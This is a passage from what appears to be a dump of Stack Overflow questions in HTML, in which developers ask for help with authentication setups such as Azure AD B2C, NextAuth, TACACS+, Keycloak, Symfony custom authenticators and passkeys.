      folders.forEach(folder =&gt; {
        console.log(`${folder.name} (${folder.id})`);
      });
    } else {
      console.log('No folders found.');
    }
  } catch (error) {
    console.error('Error listing folders:', error.message);
  }
}

listFolders();
</code></pre>
<p>which obviously is going to fetch the folders that exists in &quot;My Drive&quot; but even if the folders existed, the logs says otherwise: &quot;No folders found.&quot;</p>
<p>Any thoughts?</p>
<p>I use service account for this one but still i can't make it work and yes the credentials are there in my .json file</p>
"
"<p>I have used the standard .net8 Blazor Web App template to create a Blazor server side web app with Authentication type Individual Accounts (Identity)
Interactive render mode Sever
Include Sample Pages checked</p>
<p>I then created and used a B2C tenant to register the app and added the user flow .etc stuff</p>
<p>Then per some tutorials and docs advice I  added tis to the code:</p>
<p>in appsettings.json</p>
<pre><code>    &quot;AzureAdB2C&quot;: {
      &quot;Instance&quot;: &quot;https://mydomain.b2clogin.com/tfp/&quot;,
      &quot;ClientId&quot;: &quot;********&quot;,
      &quot;ClientSecret&quot;: &quot;****&quot;,
      &quot;CallbackPath&quot;: &quot;/signin-oidc&quot;,
      &quot;SignedOutCallbackPath&quot;: &quot;/signout-oidc&quot;,
      &quot;Domain&quot;: &quot;mydomain.onmicrosoft.com&quot;,
      &quot;SignUpSignInPolicyId&quot;: &quot;B2C_1_SiginOnly&quot;
</code></pre>
<p>in Program.cs</p>
<pre><code>    builder.Services.AddAuthentication()
        .AddMicrosoftIdentityWebApp(builder.Configuration.GetSection(&quot;AzureAdB2C&quot;));

    // Configure OpenID Connect options
    builder.Services.Configure&lt;OpenIdConnectOptions&gt;(OpenIdConnectDefaults.AuthenticationScheme, options =&gt;
    {
        options.Events = new OpenIdConnectEvents
        {
            OnTokenValidated = async context =&gt;   //both
            {
                var signInManager =   context.HttpContext.RequestServices.GetRequiredService&lt;SignInManager&lt;ApplicationUser&gt;&gt;();
                var userManager = context.HttpContext.RequestServices.GetRequiredService&lt;UserManager&lt;ApplicationUser&gt;&gt;();
                var email = context.Principal.FindFirst(&quot;emails&quot;)?.Value;
                if (email != null)
                {
                    var user = await userManager.FindByEmailAsync(email);
                    if (user != null)
                    {
                        await signInManager.SignInAsync(user, isPersistent: false);
                    }
                    else
                    {
                        // User not found in local Identity system, handle accordingly
                    }
                }
                else
                {
                    // Email claim not found, handle accordingly
                }
            },
        };
    });

</code></pre>
<p>I also annotated a Blazor page with this to test the challenge:
@attribute [Authorize(Roles = &quot;Admin&quot;)]</p>
<p>After adding the b2c user and a admin role to the identity tables this actually worked very well - OR SO I THOUHGT.</p>
<p>I worked great with only one app running but when I created a second similar app to test SSO with two registered apps funny things happened like:</p>
<ol>
<li>I would launch App A and then App B</li>
<li>Then sign into App A and then App B</li>
<li>Then try to logout of App A and I would get this:
AntiforgeryValidationException: The provided antiforgery token was meant for a different claims-based user than the current user.</li>
<li>Also strange cross app things like logging into one app would would cause the other to appear un-authenticated.</li>
</ol>
<p>I believe that these issues are cookie related and are probably introduced by this line of code:
await signInManager.SignInAsync(user, isPersistent: false);</p>
<p>But I can't find a way out of this rabbit hole :(</p>
<p>I thought this would be a very desirable thing to do, use external authentication for SSO and use Core Identity to set up roles for authorization (and other stuff)</p>
<p>There are some tutorials and docs that do purport to do this but they all fall short by not actually showing the use of Identity for authenticating on directives like:
@attribute [Authorize(Roles = &quot;Admin&quot;)]
and not discussing testing using two registered apps to test SSO.</p>
<p>Has anyone got this to work successfully and/or offer advice on how to do this.</p>
<p>Thank you.</p>
<p>Testing using one registered app:
This worked perfectly</p>
<p>Testing using two registered apps:
funny things happened like:</p>
<ol>
<li>I would launch App A and then App B</li>
<li>Then sign into App A and then App B</li>
<li>Then try to logout of App A and I would get this:
AntiforgeryValidationException: The provided antiforgery token was meant for a different claims-based user than the current user.</li>
<li>Also strange cross app things like logging into one app would would cause the other to appear un-authenticated.</li>
</ol>
"
"<p>I'm attempting to deploy TACACS+ on several HPE 5120 switches remotely to integrate authentication via Active Directory instead of using generic accounts. However, I'm encountering an issue when applying the TACACS+ configuration via SSH.</p>
<p>Applied Configuration:</p>
<pre><code>hwtacacs scheme clearpass_tacacs
 primary authentication 172.17.10.x
 primary authorization 172.17.10.x
 primary accounting 172.17.10.x
 key authentication cipher &lt;cipher_key&gt;
 key authorization cipher &lt;cipher_key&gt;
 key accounting cipher &lt;cipher_key&gt;
 user-name-format without-domain
 nas-ip 192.168.1.x

domain ghtncb
 authentication login hwtacacs-scheme clearpass_tacacs local
 authorization login hwtacacs-scheme clearpass_tacacs local
 accounting login hwtacacs-scheme clearpass_tacacs
 accounting command hwtacacs-scheme clearpass_tacacs
 authorization command hwtacacs-scheme clearpass_tacacs

user-interface aux 0
authentication-mode password
set authentication password cipher &lt;password_cipher&gt;

user-interface vty 0 2
authentication-mode scheme
command authorization
command accounting
protocol inbound ssh

</code></pre>
<p>After applying this configuration, I should no longer be able to connect with the generic account, but I find not only can I still connect with this account, but I also cannot execute commands due to insufficient permissions. Furthermore, it is impossible for me to connect with an AD account.</p>
<p>When applying this configuration:</p>
<pre><code>user-interface aux 0
authentication-mode password
set authentication password cipher &lt;password_cipher&gt;

user-interface vty 0 2
authentication-mode scheme
command authorization
command accounting
protocol inbound ssh

hwtacacs scheme clearpass_tacacs
 primary authentication 172.17.10.x
 primary authorization 172.17.10.x
 primary accounting 172.17.10.x
 key authentication cipher &lt;cipher_key&gt;
 key authorization cipher &lt;cipher_key&gt;
 key accounting cipher &lt;cipher_key&gt;
 user-name-format without-domain
 nas-ip 192.168.1.x

domain ghtncb
 authentication login hwtacacs-scheme clearpass_tacacs local
 authorization login hwtacacs-scheme clearpass_tacacs local
 accounting login hwtacacs-scheme clearpass_tacacs
 accounting command hwtacacs-scheme clearpass_tacacs
 authorization command hwtacacs-scheme clearpass_tacacs

</code></pre>
<p>When I try to apply the configuration related to the ghtncb domain, I receive the following error message for each command:</p>
<p><code>There are user(s) online, can not be configured.</code></p>
<p>This prevents me from applying the necessary configuration to enable authentication, authorization, and accounting via TACACS+, forcing me to consider on-site visits, which I'm trying to avoid. Has anyone encountered this problem or has any idea on how to solve this configuration blockage due to the presence of online users? Any help or suggestion would be greatly appreciated.</p>
"
"<p>I've been having problems getting full user model inside the middleware.. when I get the user it only displays their name email and picture.</p>
<p>I have the session callback and I can control user roles on the server rendered pages but I really would like to add that extra layer of protection and do it through middleware insetead!</p>
<p><strong>This is my auth.config.ts file:</strong>
`</p>
<pre><code>import type { NextAuthConfig } from 'next-auth'
import Credentials from 'next-auth/providers/credentials'
import Github from 'next-auth/providers/github'
import Google from 'next-auth/providers/google'
import { LoginSchema } from './schemas'
import bcrypt from 'bcryptjs'
import { getUserByEmail } from './server/database/user'

export default {
  providers: [
    Google({
      clientId: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET
    }),
    Github({
      clientId: process.env.GITHUB_ID,
      clientSecret: process.env.GITHUB_SECRET
    }),
    Credentials({
      async authorize(credentials) {
        const validateFields = LoginSchema.safeParse(credentials)

        if (validateFields.success) {
          const { email, password } = validateFields.data

          const user = await getUserByEmail(email)
          if (!user || !user.password) return null

          const passwordsMatch = await bcrypt.compare(password, user.password)

          if (passwordsMatch) return { ...user, password: '', role: user.role }
        }
        return null
      }
    })
  ]
} satisfies NextAuthConfig

</code></pre>
<p><strong>This is my auth .ts file</strong></p>
<pre><code>import NextAuth, { Session } from 'next-auth'
import { PrismaAdapter } from '@auth/prisma-adapter'
import authConfig from '@/auth.config'
import { db } from '@/lib/db'
import { getUserById } from '@/server/database/user'
import { getTwoFactorConfirmationByUserId } from './server/database/two-factor-confirmation'

export const {
  handlers: { GET, POST },
  auth,
  signIn,
  signOut
} = NextAuth({
  pages: {
    signIn: '/sign-in',
    error: '/auth-error'
  },
  events: {
    async linkAccount({ user }) {
      await db.user.update({
        where: { id: user.id },
        data: { emailVerified: new Date() }
      })
    }
  },
  callbacks: {
    async signIn({ user, account }) {
      //allows users with Oauth providers to access the page
      if (account?.provider !== 'credentials') return true

      const existingUser = await getUserById(user.id ?? '')

      //prevents signing in non existing users
      if (!existingUser) {
        return false
      }
      //prevents signing in without email verification
      if (!existingUser.emailVerified) return false

      //* Added two factor authentication

      if (existingUser.isTwoFactorEnabled) {
        const twoFactorConfirmation = await getTwoFactorConfirmationByUserId(
          existingUser.id
        )

        if (!twoFactorConfirmation) return false

        //Delete two factor confirmation for next sign-in
        await db.twoFactorConfirmation.delete({
          where: { id: twoFactorConfirmation.id }
        })
      }

      //Todo: in middleware and in here add Admin dashboard, protected from

      return true
    },

    async jwt({ token }) {
      if (!token.sub) return token

      const existingUser = await getUserById(token.sub)

      if (!existingUser) return token

      if (existingUser) {
        token.role = existingUser.role
      }
      return token
    },
    async session({ token, session }: { session: Session; token?: any }) {
      if (token.sub &amp;&amp; session.user) {
        session.user.id = token.sub
      }

      if (token.role &amp;&amp; session.user) {
        session.user.role = token.role
      }
      return session
    }
  },
  adapter: PrismaAdapter(db),
  session: { strategy: 'jwt' },
  ...authConfig
})

</code></pre>
<p><strong>My middleware</strong></p>
<pre><code>import NextAuth from 'next-auth'
import authConfig from './auth.config'

const { auth } = NextAuth(authConfig)

import {
  DEFAULT_LOGIN_REDIRECT,
  apiAuthPrefix,
  authRoutes,
  publicRoutes
} from './routes'

export default auth((req) =&gt; {
  const { nextUrl, auth } = req
  const isLoggedIn = !!req.auth
  const isApiAuthRoute = nextUrl.pathname.startsWith(apiAuthPrefix)
  const isPublicRoute = publicRoutes.includes(nextUrl.pathname)
  const isAuthRoute = authRoutes.includes(nextUrl.pathname)

  console.log(auth?.user)

  if (isApiAuthRoute) {
    return null
  }

  if (isAuthRoute) {
    if (isLoggedIn) {
      return Response.redirect(new URL(DEFAULT_LOGIN_REDIRECT, nextUrl))
    }
    return null
  }
  if (!isLoggedIn &amp;&amp; !isPublicRoute) {
    return Response.redirect(new URL('/sign-in', nextUrl))
  }

  return null
})

export const config = {
  matcher: ['/((?!.+\\.[\\w]+$|_next).*)', '/', '/(api|trpc)(.*)']
}
</code></pre>
"
"<p>Is there a way to force passkey generation to Google password manager instead of Samsung Pass.
The code I share below currently uses the default option chosen by the user in an Android Device.
I don't want user to be able to use Samsung Pass since authentication has some bugs on Samsung Pass Passkeys, found out that some apps are forcing google password manager but no documentation at all.</p>
<pre class=""lang-kotlin prettyprint-override""><code>  private fun getCurrentActivity(): Activity? {
    val activityProvider: ActivityProvider = moduleRegistry.getModule(ActivityProvider::class.java)
    return activityProvider.currentActivity
  }

  @ExpoMethod
  fun register(requestJSON: String, promise: Promise) {
    val credentialManager = CredentialManager.create(context)
    val createPublicKeyCredentialRequest = CreatePublicKeyCredentialRequest(requestJSON)
    val currentActivity = getCurrentActivity()

    moduleCoroutineScope.launch {
      try {
        val result = currentActivity?.let { credentialManager.createCredential(it, createPublicKeyCredentialRequest) }
        val response = result?.data?.getString(REGISTRATION_RESPONSE)
        promise.resolve(response)
      } catch (e: CreateCredentialException) {
        promise.reject(&quot;Passkey&quot;, handleRegistrationException(e))
      }
    }
  }
</code></pre>
<p>I tried to create passkey as described in the Android docs yet, if I go to settings in my device and change the default autofill options to Samsung Pass, it creates the passkey in Samsung Pass.
I want it to be saved in Google Password Manager, no matter what.</p>
"
"<p>we have legacy Backend which stored users with their password . we need create oAuth2 provider for our bussiness . there is recommendation to use Keycloak for this purpose . but</p>
<ul>
<li>can i import my users with hashed password to Keycloak ?</li>
<li>is it good to use this service ?</li>
<li>can you provide advice and recommendation ?</li>
</ul>
"
"<p>I am trying to make a data flow task in SSIS where I insert data from an OLE DB Source to an OLE DB Destination (i.e. two different SQL Server instances on different VMs). I was able to get the OLE DB Source connection to work. The OLE DB Source is a SQL Server instance on a personal VM that I use for staging and data conversion.</p>
<p>However, when I try to establish the OLE DB Destination I keep getting an error because the destination SQL Server is on a different VM/data server. No matter which provider, server name, or credentials I use I cannot get it to work.</p>
<p>Can anyone please point me the in the right direction?</p>
<p><a href=""https://i.stack.imgur.com/ZHAQW.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ZHAQW.jpg"" alt=""enter image description here"" /></a></p>
<p>I usually use &quot;Microsoft OLE DB Provider for SQL Server&quot; for the source so I thought I could do the same with the destination, but I'm not sure which authentication I should be using?</p>
<p><a href=""https://i.stack.imgur.com/n1sBc.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/n1sBc.jpg"" alt=""enter image description here"" /></a></p>
<p>Here is the error I get when I try, for example, the sa account:</p>
<p><a href=""https://i.stack.imgur.com/gsUWF.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/gsUWF.jpg"" alt=""enter image description here"" /></a></p>
"
"<p>I'm encountering an authentication issue when attempting to implement custom authentication for the login process in Symfony. Despite configuring the security.yml file to allow access without authentication for certain routes, notably the login route, I'm consistently receiving the error message:</p>
<p>&quot;Invalid or Tampered Token: HMAC Validation Failed (401 Unauthorized)&quot;</p>
<p>Here's a snippet of my security.yml configuration:</p>
<pre><code>    security:
  # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords
  password_hashers:
    Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface: 'auto'
  # https://symfony.com/doc/current/security.html#loading-the-user-the-user-provider
  providers:
    users_in_memory: { memory: null }
  firewalls:
    dev:
      pattern: ^/(_(profiler|wdt)|css|images|js)/
      security: false
    main:
      lazy: true
      stateless: true
      custom_authenticators:
        - App\Security\CustomAuthenticator

      provider: users_in_memory

      # https://symfony.com/doc/current/security.html#the-firewall

      # https://symfony.com/doc/current/security/impersonating_user.html
      # switch_user: true

  # Easy way to control access for large sections of your site
  # Note: Only the *first* access control that matches will be used
  access_control:
    - { path: ^/api/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }
    - { path: '^/', roles: IS_AUTHENTICATED_FULLY }

when@test:
  security:
    password_hashers:
      # By default, password hashers are resource intensive and take time. This is
      # important to generate secure password hashes. In tests however, secure hashes
      # are not important, waste resources and increase test times. The following
      # reduces the work factor to the lowest possible values.
      Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface:
        algorithm: auto
        cost: 4 # Lowest possible value for bcrypt
        time_cost: 3 # Lowest possible value for argon
        memory_cost: 10 # Lowest possible value for argon
</code></pre>
<p>here is my customauthentication class :</p>
<pre><code>
    &lt;?php

namespace App\Security;

use Doctrine\ORM\EntityManagerInterface;
use Exception;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpKernel\Exception\UnauthorizedHttpException;
use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
use Symfony\Component\Security\Core\Exception\AuthenticationException;
use Symfony\Component\Security\Core\User\UserInterface;
use Symfony\Component\Security\Http\Authenticator\AuthenticatorInterface;
use Symfony\Component\Security\Http\Authenticator\Passport\Badge\UserBadge;
use Symfony\Component\Security\Http\Authenticator\Passport\Passport;

use App\Entity\User; // Assuming your User entity is in the App\Entity namespace

class CustomAuthenticator implements AuthenticatorInterface
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }

    public function supports(Request $request): ?bool
    {
       return true;
    }

    public function authenticate(Request $request): Passport
    {
        $requestData = json_decode($request-&gt;getContent(), true);
        if (!isset($requestData['name'])) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Required field &quot;name&quot; is missing');
        }

        $name = $requestData['name'];

        try {
            $decryptedName = $this-&gt;decrypt($name);
        } catch (Exception $e) {
            throw new UnauthorizedHttpException('Invalid credentials', 'Invalid or tampered token'.$e-&gt;getMessage());
        }

        $user = $this-&gt;loadUser($decryptedName);

        $userBadge = new UserBadge($decryptedName, function ($name) {
            return $this-&gt;loadUser($name);
        });

        return new Passport($userBadge);
    }

    private function loadUser(string $name): ?UserInterface
    {
        return $this-&gt;entityManager-&gt;getRepository(User::class)-&gt;findOneBy(['name' =&gt; $name]);
    }

    private function decrypt($string): string
    {
        // Retrieve the secret key
        $secretKey = $_ENV['APP_SECRET'];
        if (!$secretKey) {
            throw new \RuntimeException('APP_SECRET environment variable is not set.');
        }

        // Derive the encryption key from the secret key
        $key = openssl_digest($secretKey, 'SHA256', TRUE);

        // Extract the IV, HMAC, and ciphertext from the encoded string
        $ciphertext = base64_decode($string);
        $ivLength = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = substr($ciphertext, 0, $ivLength);
        $hmac = substr($ciphertext, $ivLength, $sha2len = 32);
        $ciphertextRaw = substr($ciphertext, $ivLength + $sha2len);

        // Ensure the IV is exactly 16 bytes long
        $iv = str_pad($iv, $ivLength, &quot;\0&quot;);

        // Verify the HMAC to ensure integrity
        $calculatedHmac = hash_hmac('sha256', $ciphertextRaw, $key, true);
        if (!hash_equals($hmac, $calculatedHmac)) {
            throw new \RuntimeException('HMAC validation failed.');
        }

        // Decrypt the ciphertext to obtain the original plaintext
        $originalPlaintext = openssl_decrypt($ciphertextRaw, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        if ($originalPlaintext === false) {
            throw new \RuntimeException('Decryption failed.');
        }

        return $originalPlaintext;

    }
    public function onAuthenticationSuccess(Request $request, TokenInterface $token, string $firewallName): ?Response
    {
        return new Response('Authenticated Successfully', Response::HTTP_OK);
    }

    public function onAuthenticationFailure(Request $request, AuthenticationException $exception): ?Response
    {
        return new Response('Unauthorized', Response::HTTP_UNAUTHORIZED);
    }

    public function createToken(Passport $passport, string $firewallName): TokenInterface
    {
        throw new \LogicException('This method should not be called for stateless authentication.');
    }
}
</code></pre>
<p>and here is my usercontroller class :</p>
<pre><code>
    &lt;?php

namespace App\Controller;

use App\Entity\Company;
use App\Entity\User;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Validator\Validator\ValidatorInterface;

class UserController extends AbstractController
{
    private $entityManager;

    public function __construct(EntityManagerInterface $entityManager)
    {
        $this-&gt;entityManager = $entityManager;
    }


    #[Route('/api/login', name: 'login', methods: ['POST'])]
    public function login(Request $request): JsonResponse
    {
        // Retrieve the request data
        $requestData = json_decode($request-&gt;getContent(), true);

        // Ensure the required fields are provided
        if (!isset($requestData['name'])) {
            return new JsonResponse(['error' =&gt; 'Name field is required'], Response::HTTP_BAD_REQUEST);
        }

        $name = $requestData['name'];

        // Encrypt the name
        $encryptedName = $this-&gt;encrypt($name);

        // Generate a token based on the encrypted name
        $token = $this-&gt;generateToken($encryptedName);

        // Return the token to the client
        return new JsonResponse(['token' =&gt; $token]);
    }

    private function encrypt(string $name): string
    {
        $secretKey = $_ENV['APP_SECRET'];
        $key = openssl_digest($secretKey, 'SHA256', TRUE);
        $ivlen = openssl_cipher_iv_length($cipher = &quot;AES-128-CBC&quot;);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $ciphertextRaw = openssl_encrypt($name, $cipher, $key, OPENSSL_RAW_DATA, $iv);
        $hmac = hash_hmac('sha256', $ciphertextRaw, $key, true);
        $output = base64_encode($iv . $hmac . $ciphertextRaw);

        return $output;
    }

    private function generateToken(string $encryptedName): string
    {
        // Generate a token based on the encrypted name
        return hash('sha256', $encryptedName);
    }
    #[Route('/api/users', name: 'user_index', methods: ['GET'])]
    public function index(): Response
    {
        $currentUser = $this-&gt;getUser();

        if (!$currentUser) {
            return $this-&gt;json(['error' =&gt; 'User not authenticated'], Response::HTTP_UNAUTHORIZED);
        }

        $userRepository = $this-&gt;entityManager-&gt;getRepository(User::class);

        if (in_array('ROLE_SUPER_ADMIN', $currentUser-&gt;getRoles())) {
            $users = $userRepository-&gt;findAll();
        } elseif (in_array('ROLE_COMPANY_ADMIN', $currentUser-&gt;getRoles())) {
            $users = $userRepository-&gt;findBy(['company' =&gt; $currentUser-&gt;getCompany()]);
        } else {
            $users = [$currentUser];
        }

        return $this-&gt;json($users);
    }

    #[Route('/api/users/{id}', name: 'user_show', methods: ['GET'])]
    public function show(User $user): Response
    {
        $currentUser = $this-&gt;getUser();

        if (!$currentUser) {
            return $this-&gt;json(['error' =&gt; 'User not authenticated'], Response::HTTP_UNAUTHORIZED);
        }

        if (!in_array('ROLE_SUPER_ADMIN', $currentUser-&gt;getRoles()) &amp;&amp;
            ($user-&gt;getCompany() !== $currentUser-&gt;getCompany() || !in_array('ROLE_COMPANY_ADMIN', $currentUser-&gt;getRoles()))) {
            return $this-&gt;json(['error' =&gt; 'Access denied'], Response::HTTP_FORBIDDEN);
        }

        return $this-&gt;json($user);
    }

    #[Route('/api/users', name: 'user_new', methods: ['POST'])]
    public function new(Request $request, ValidatorInterface $validator): Response
    {
        $currentUser = $this-&gt;getUser();

        if (!$currentUser) {
            return $this-&gt;json(['error' =&gt; 'User not authenticated'], Response::HTTP_UNAUTHORIZED);
        }

        if (!in_array('ROLE_SUPER_ADMIN', $currentUser-&gt;getRoles()) &amp;&amp; !in_array('ROLE_COMPANY_ADMIN', $currentUser-&gt;getRoles())) {
            return $this-&gt;json(['error' =&gt; 'Access denied'], Response::HTTP_FORBIDDEN);
        }

        // Check if Content-Type is application/json
        if ($request-&gt;headers-&gt;get('Content-Type') !== 'application/json') {
            return $this-&gt;json(['error' =&gt; 'Request must be JSON'], Response::HTTP_UNSUPPORTED_MEDIA_TYPE);
        }

        // Decode JSON content
        $data = json_decode($request-&gt;getContent(), true);

        // Check if decoding was successful
        if ($data === null &amp;&amp; json_last_error() !== JSON_ERROR_NONE) {
            return $this-&gt;json(['error' =&gt; 'Invalid JSON'], Response::HTTP_BAD_REQUEST);
        }

        // Check if required fields are present
        if (!isset($data['name']) || !isset($data['role'])) {
            return $this-&gt;json(['error' =&gt; 'Name and role are required'], Response::HTTP_BAD_REQUEST);
        }

        // Create new user
        $user = new User();
        $user-&gt;setName($data['name']);
        $user-&gt;setRole($data['role']);

        // Validate the user entity
        $errors = $validator-&gt;validate($user);

        // Check if there are any validation errors
        if (count($errors) &gt; 0) {
            $errorMessages = [];
            foreach ($errors as $error) {
                $errorMessages[] = $error-&gt;getMessage();
            }

            return $this-&gt;json(['errors' =&gt; $errorMessages], Response::HTTP_BAD_REQUEST);
        }

        // If the role is super admin, set company_id to null
        if ($data['role'] === 'ROLE_SUPER_ADMIN') {
            $user-&gt;setCompany(null);
        } else {
            // Check if company_id is provided and set it if present
            if (isset($data['company_id'])) {
                // Fetch company entity based on the provided company_id
                $company = $this-&gt;entityManager-&gt;getRepository(Company::class)-&gt;find($data['company_id']);
                if (!$company) {
                    return $this-&gt;json(['error' =&gt; 'Invalid company_id'], Response::HTTP_BAD_REQUEST);
                }
                // Set the company for the user
                $user-&gt;setCompany($company);
            }
        }

        // Persist user and associated entities to the database
        $this-&gt;entityManager-&gt;persist($user);
        $this-&gt;entityManager-&gt;flush();

        // Return created user
        return $this-&gt;json($user, Response::HTTP_CREATED);
    }

    #[Route('/api/users/{id}', name: 'user_delete', methods: ['DELETE'])]
    public function delete(User $user): Response
    {
        $currentUser = $this-&gt;getUser();

        if (!$currentUser) {
            return $this-&gt;json(['error' =&gt; 'User not authenticated'], Response::HTTP_UNAUTHORIZED);
        }

        if (!in_array('ROLE_SUPER_ADMIN', $currentUser-&gt;getRoles())) {
            return $this-&gt;json(['error' =&gt; 'Access denied'], Response::HTTP_FORBIDDEN);
        }

        // Delete the user
        $this-&gt;entityManager-&gt;remove($user);
        $this-&gt;entityManager-&gt;flush();

        return $this-&gt;json(['message' =&gt; 'User deleted'], Response::HTTP_OK);
    }
}
</code></pre>
<p>Despite specifying that the /login route should be accessible without authentication, I'm still encountering this error. It's worth mentioning that my logic of authentication has worked successfully in Laravel, but in Symfony, it seems to encounter this issue. In my Symfony application, I'm using a similar approach where I authenticate users by their name and utilize an app_secret stored in the .env file for decryption.</p>
<p>Could someone please provide guidance on what might be causing this error and how to resolve it? I'm puzzled by Symfony's authentication logic and would appreciate any insights or suggestions for troubleshooting. Thank you.</p>
"
"<p>Good morning people,</p>
<p>I'm to get all the teams members of the Microsoft Teams teams in the organization of the user who signing on my web.</p>
<p>The login was made with <strong>GraphServiceClient</strong></p>
<p>Once the user login, I save the graphClient instance and in my controller I have this code:</p>
<pre><code>public async Task&lt;IActionResult&gt; Index()
{
    List&lt;UserModel&gt; users = new List&lt;UserModel&gt;();
    var result = await graphClient.Teams.GetAsync();
    foreach (var team in result.Value)
    {
        var members = await graphClient.Teams[team.Id].Members.GetAsync();
        foreach (var member in members.Value)
        {
            var user = await graphClient.Users[member.UserId].GetAsync();
            UserModel userModel = new UserModel(user.Id, user.DisplayName, user.Mail, user.Department, user.JobTitle, user.MobilePhone, user.OfficeLocation, &quot;&quot;);
            users.Add(userModel);
        }
    }
    return View(users);
}
</code></pre>
<p>The problem is this:
<a href=""https://i.stack.imgur.com/9lk6p.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9lk6p.png"" alt=""enter image description here"" /></a></p>
<p>But when I run the same query in Microsoft Graph Explorer, I notice the object member must contain a UserId property.</p>
<p><a href=""https://i.stack.imgur.com/6Fc7P.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6Fc7P.png"" alt=""enter image description here"" /></a></p>
<p>And if that's not enough, debugging the solution, I can notice effectively my object member contain a UserId property.</p>
<p><a href=""https://i.stack.imgur.com/i4DY0.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/i4DY0.jpg"" alt=""enter image description here"" /></a></p>
<p>So where is the problem?</p>
"
"<p>I’m working on a project where I’m creating a platform in which to use it, customers need to log in and each customers dashboard will be specific to them- think like a bank account log in.</p>
<p>I’m want to use Auth0 for this. I would like it to have the customer type in an email, send the customer a one time passcode for authentications and then have the customer dashboard open. Is this possible?</p>
<p>I’ve tried it on ALT0 but have failed so far.</p>
"
"<p>I'm currently implementing Azure AD authentication for user login in a Meeting Room Booking System (MRBS) <a href=""https://github.com/meeting-room-booking-system/mrbs-code/tree/main"" rel=""nofollow noreferrer"">https://github.com/meeting-room-booking-system/mrbs-code/tree/main</a>. I've followed the provided documentation and integrated the authentication logic <a href=""https://github.com/meeting-room-booking-system/mrbs-code/blob/main/AUTHENTICATION#L969"" rel=""nofollow noreferrer"">https://github.com/meeting-room-booking-system/mrbs-code/blob/main/AUTHENTICATION#L969</a> into my codebase. However, I'm encountering some errors and difficulties in debugging the process and code.</p>
<p>I've configured the necessary parameters in config.inc.php, including the Azure AD client ID, client secret, redirect URI, and tenant ID. However, when I try to authenticate using Azure AD, I'm not redirected to the Azure AD sign-in page as expected.</p>
<p>I suspect there might be errors in the authentication logic or issues with handling the callback after authentication. Additionally, I'm not sure how to properly handle errors and debug the process.</p>
<p>Can someone help me understand what might be going wrong with the authentication flow in this code? How can I properly handle errors and debug the Azure AD authentication process in PHP?</p>
<p>My purpose is that I want to enable the login process in the MRBS through email id (user can login with their organization email id (microsoft))</p>
<p>I'm using the AuthAzuread class provided by the MRBS project, which handles the authentication flow with Azure AD.</p>
<pre><code>&lt;?php
namespace MRBS\Auth;

/*
 * Authentication scheme that uses Azure AD for user authentication.
 * Main file: https://github.com/meeting-room-booking-system/mrbs-code/tree/main
 *
 * For Authentication documentation: https://github.com/meeting-room-booking-system/mrbs-code/blob/main/AUTHENTICATION
 *
 * To use this authentication scheme, set the following in config.inc.php:
 *
 * $auth[&quot;type&quot;] = &quot;azuread&quot;;
 * $auth[&quot;azuread_client_id&quot;] = &quot;YOUR_AZUREAD_CLIENT_ID&quot;;
 * $auth[&quot;azuread_client_secret&quot;] = &quot;YOUR_AZUREAD_CLIENT_SECRET&quot;;
 * $auth[&quot;azuread_redirect_uri&quot;] = &quot;https://your-mrbs-url.com/login.php&quot;; // Redirect URI configured in Azure AD
 * $auth[&quot;azuread_tenant_id&quot;] = &quot;YOUR_AZUREAD_TENANT_ID&quot;;
 *
 */

use MRBS\User;

class AuthAzuread extends Auth
{
    private $auth;

    public function __construct($auth)
    {
        $this-&gt;auth = $auth;
        // Check if azuread_tenant_id, azuread_client_id, and azuread_client_secret are provided
        if (!isset($this-&gt;auth['azuread_tenant_id'])) {
            throw new \Exception(&quot;Azure AD Tenant ID is missing.&quot;);
        }
        if (!isset($this-&gt;auth['azuread_client_id'])) {
            throw new \Exception(&quot;Azure AD Client ID is missing.&quot;);
        }
        if (!isset($this-&gt;auth['azuread_client_secret'])) {
            throw new \Exception(&quot;Azure AD Client Secret is missing.&quot;);
        }
    }

    public function validateUser(?string $user, ?string $pass)
    {
        // Encode the redirect URI
        $redirectUri = urlencode($this-&gt;auth[&quot;azuread_redirect_uri&quot;]);

        // Redirect users to Azure AD sign-in page
        $azureADSignInUrl = &quot;https://login.microsoftonline.com/{$this-&gt;auth['azuread_tenant_id']}/oauth2/v2.0/authorize?&quot; . http_build_query([
            &quot;client_id&quot; =&gt; $this-&gt;auth[&quot;azuread_client_id&quot;],
            &quot;response_type&quot; =&gt; &quot;code&quot;,
            &quot;redirect_uri&quot; =&gt; $redirectUri, // Include the encoded redirect URI
            &quot;scope&quot; =&gt; &quot;openid profile email&quot;,
        ]);

        header(&quot;Location: $azureADSignInUrl&quot;);
        exit;
    }

    public function handleCallback()
    {
        if (isset($_GET['code'])) {
            $authorizationCode = $_GET['code'];

            // Exchange authorization code for access token
            $tokenEndpoint = &quot;https://login.microsoftonline.com/{$this-&gt;auth['azuread_tenant_id']}/oauth2/v2.0/token&quot;;
            $tokenParams = [
                &quot;grant_type&quot; =&gt; &quot;authorization_code&quot;,
                &quot;client_id&quot; =&gt; $this-&gt;auth[&quot;azuread_client_id&quot;],
